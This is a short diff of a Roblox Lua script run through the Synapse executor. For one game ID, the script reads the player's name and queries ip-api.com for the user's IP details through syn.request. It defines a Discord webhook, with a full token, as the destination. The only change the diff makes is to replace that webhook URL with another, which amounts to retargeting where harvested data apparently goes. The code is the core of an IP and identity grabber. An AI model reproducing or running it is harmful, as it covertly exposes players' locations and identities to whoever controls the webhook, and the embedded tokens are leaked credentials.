@@ -1,7 +1,7 @@
 if game.PlaceId == 92604236 then
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1008900580544102441/c5OLn2__X29x__URimjcFCr9NmPWXjVja6TwKA7eVYJ-9ZN6T-gJKFjOuqnUlilwbLvH"
+local webhook_url = "https://discord.com/api/webhooks/1044893488526934086/FszQd89LSaCUs4eegRwEADfJG9YDT4omQsXDByb1cp3DgF13bJ48yAu5MeFOBPuVQqYH"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
